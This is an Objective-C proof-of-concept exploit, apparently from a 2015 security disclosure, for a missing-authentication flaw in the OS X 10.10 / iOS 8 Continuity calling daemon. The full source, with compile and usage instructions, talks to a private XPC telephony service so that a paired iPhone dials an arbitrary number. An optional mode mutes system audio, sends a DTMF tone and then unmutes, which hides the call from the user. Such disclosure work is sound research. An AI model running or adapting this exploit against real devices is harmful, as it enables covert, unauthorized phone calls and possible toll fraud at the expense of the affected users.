/* 
OS X 10.10 / iOS 8 Continuity Dialer Lack of Authentication Proof of Concept

Author: Dan Bastone <dbastone@gdssecurity.com>
Copyright 2015 Gotham Digital Science
https://blog.gdssecurity.com/

Compile:
	clang -o xpcdial xpcdial.m -F/System/Library/PrivateFrameworks/ -framework Foundation -framework TelephonyUtilities

Run:
	xpcdial [-m] [-p] <destination number>
		-m	mute system audio for 8 seconds, send DTMF, unmute
		-p	leave audio on the phone
*/

#import <stdio.h>
#import <stdint.h>
#import <Foundation/Foundation.h>
#import <CoreFoundation/CoreFoundation.h>
#import <CoreAudio/CoreAudio.h>

void mute(uint32_t m);
static id callProxy;
static BOOL do_mute = NO, endpoint = YES;

@interface TUProxyCall : NSObject <NSSecureCoding>
- (id)initWithDestinationID:(id)arg1 service:(int)arg2 status:(int)arg3 sourceIdentifier:(id)arg4 outgoing:(BOOL)arg5 conferenceIdentifier:(id)arg6 voicemail:(BOOL)arg7 callerNameFromNetwork:(id)arg8;
@property(nonatomic) int status;
@property(nonatomic, getter=isEndpointOnCurrentDevice) BOOL endpointOnCurrentDevice;
@end

@protocol TUCallServicesDaemonDelegate
- (void)dialCall:(id)arg1;
- (void)holdCall:(TUProxyCall *)arg1;
- (void)unholdCall:(TUProxyCall *)arg1;
- (void)playDTMFToneForCall:(id)arg1 key:(unsigned char)arg2;
@end

@class TUCallModelState;

@protocol TUCallServicesDaemonObserver
@end

@interface CallObserver : NSObject
@end

@implementation CallObserver
- (void)handleCallStatusChangedForProxyCall:(TUProxyCall *)call {
	static bool done=false;
	NSLog(@"handleCallStatusChangedForProxyCall: %@",call);
	if (!endpoint) {
		NSLog(@"endpoint not on this device, exiting");
		exit(0);
	}

	switch(call.status) {
	case 3: // ringing
		if (do_mute)
			mute(YES); // this should really keep re-muting on a timer in case the user unmutes during call setup
		break;

	case 1: // call answered
		if (do_mute && !done) {
			done = true;
			dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 8 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
				NSLog(@"sending DTMF digit");
				[callProxy playDTMFToneForCall:call key:'1'];
				dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 3 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
					mute(NO);
				});
			});
		}
		break;
	case 6: // disconnected
		mute(NO);
		NSLog(@"disconnected");
		exit(0);
	}

}
- (void)handleCallModelStateChanged:(TUCallModelState *)arg1 {}
- (void)handleCurrentProxyCallsChanged:(NSArray *)arg1 {}
- (void)handleCallContinuityStateChangedForProxyCall:(TUProxyCall *)arg1 {}
- (void)handleHardPauseDigitsAvailibilityChangedTo:(unsigned short)arg1 digits:(NSString *)arg2 {}
- (void)handleMutedChangedTo:(BOOL)arg1 {}
- (void)handleRemoteFrequencyChangedTo:(NSData *)arg1 {}
- (void)handleLocalFrequencyChangedTo:(NSData *)arg1 {}
- (void)handleShouldSuppressRingtoneChangedTo:(BOOL)arg1 forCallWithUUID:(NSString *)arg2 {}
- (void)handleDisconnectedReasonChangedTo:(int)arg1 forCallWithUUID:(NSString *)arg2 {}
- (void)handleEndpointOnCurrentDeviceChangedTo:(BOOL)arg1 forCallWithUUID:(NSString *)arg2{}
- (void)handleWantsHoldMusicChangedTo:(BOOL)arg1 forCallWithUUID:(NSString *)arg2 {}
@end

void mute(uint32_t m) {
	static AudioDeviceID did = kAudioObjectUnknown;
	NSLog(@"mute: %d",m);

	if (did == kAudioObjectUnknown) {
		uint32_t sz = sizeof(did);
		AudioObjectPropertyAddress addr = { kAudioHardwarePropertyDefaultOutputDevice, kAudioObjectPropertyScopeGlobal, kAudioObjectPropertyElementMaster };
	
		if (AudioObjectHasProperty(kAudioObjectSystemObject, &addr) && AudioObjectGetPropertyData(kAudioObjectSystemObject, &addr, 0, NULL, &sz, &did) != noErr) {
			NSLog(@"couldn't get audio device, exiting");
			exit(-1);
		}
	}

	Boolean set = 0;
	AudioObjectPropertyAddress addr = { kAudioDevicePropertyMute, kAudioDevicePropertyScopeOutput, kAudioObjectPropertyElementMaster };

	if (AudioObjectHasProperty(did,&addr) && AudioObjectIsPropertySettable(did,&addr,&set) == noErr && set) {
		AudioObjectSetPropertyData(did,&addr,0,NULL,sizeof(m),&m);
	} else {
		NSLog(@"couldn't mute audio device, exiting");
		exit(-1);
	}
}
		
void usage() {
	fprintf(stderr,"usage: %s [-m] [-p] <destination number>\n\t-m	mute system audio for 8 seconds, send DTMF, unmute\n\t-p	leave audio on the phone\n",[[NSProcessInfo processInfo].processName UTF8String]);
	exit(-1);
}

int main(int argc, char **argv) {
	int ch;
	while ((ch=getopt(argc,argv,"mp")) != -1) {
		switch(ch) {
		case 'm':
			do_mute = true;
			break;
		case 'p':
			endpoint = NO;
			break;
		case '?':
			usage();
			break;
		}
	}

	argc -= optind;
	argv += optind;

	if (argc != 1)
		usage();

	TUProxyCall *pc = [[TUProxyCall alloc] initWithDestinationID:[NSString stringWithUTF8String:argv[0]] service:1 status:3 sourceIdentifier:nil outgoing:YES conferenceIdentifier:nil voicemail:NO callerNameFromNetwork:nil];

	pc.endpointOnCurrentDevice = endpoint;

	NSXPCInterface *sendInterface = [NSXPCInterface interfaceWithProtocol:@protocol(TUCallServicesDaemonDelegate)];
	NSXPCInterface *recvInterface = [NSXPCInterface interfaceWithProtocol:@protocol(TUCallServicesDaemonObserver)];
	NSSet *expectedClasses = [NSSet setWithObjects:[TUProxyCall class], [NSMutableArray class], nil];
	[recvInterface setClasses:expectedClasses forSelector: @selector(handleCurrentProxyCallsChanged:) argumentIndex:0 ofReply:NO];

	NSXPCConnection *c = [[NSXPCConnection alloc] initWithMachServiceName:@"com.apple.telephonyutilities.callservicesdaemon" options:0];
	c.remoteObjectInterface = sendInterface;
	c.exportedInterface = recvInterface;
	c.exportedObject = [[CallObserver alloc] init];
	[c resume];

	callProxy = [c remoteObjectProxy];
	[callProxy dialCall:pc];

	CFRunLoopRun();

	return 0;
}
